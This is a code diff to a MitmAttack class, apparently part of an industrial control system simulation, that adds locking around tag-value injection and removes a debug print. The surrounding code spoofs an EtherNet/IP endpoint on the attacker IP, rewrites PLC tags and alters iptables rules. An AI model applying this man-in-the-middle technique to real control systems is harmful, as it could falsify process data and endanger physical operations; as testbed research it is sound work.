@@ -36,6 +36,8 @@ class MitmAttack(SyncedAttack):
         self.thread = None
         self.run_thread = False
 
+        self.dict_lock = threading.Lock()
+
     def setup(self):
         # Add the iptables rules
         # os.system('iptables -t nat -A POSTROUTING --destination 192.168.1.254 -j SNAT --to-source 192.168.1.1')
@@ -47,9 +49,8 @@ class MitmAttack(SyncedAttack):
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-
-        cmd = shlex.split( '/usr/bin/python2 -m cpppo.server.enip --print --address ' +
-                           self.attacker_ip + ':44818 T2:1=REAL V_ER2i:1=REAL')
+        cmd = shlex.split('/usr/bin/python2 -m cpppo.server.enip --print --address ' +
+                          self.attacker_ip + ':44818 T2:1=REAL V_ER2i:1=REAL')
         self.server = subprocess.Popen(cmd, shell=False)
 
         self.run_thread = True
@@ -105,8 +106,14 @@ class MitmAttack(SyncedAttack):
         cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
                str(self.intermediate_attack['local_ip'])]
 
+        # Acquire the lock
+        self.dict_lock.acquire()
+
         for tag in self.tags:
             cmd.append(str(tag) + ':1=' + str(self.tags[tag]))
+
+        # Release the lock
+        self.dict_lock.release()
 
         return cmd
 
@@ -120,7 +127,6 @@ class MitmAttack(SyncedAttack):
                 client.wait()
             except Exception as error:
                 print('ERROR enip _send multiple: ', error)
-            self.receive_original_tags()
             time.sleep(0.05)
 
     def interrupt(self):
@@ -149,7 +155,6 @@ class MitmAttack(SyncedAttack):
             if not self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                 self.teardown()
                 self.state = 2
-        print("MITM 💻:", "state", self.state)
 
 
 def is_valid_file(parser_instance, arg):
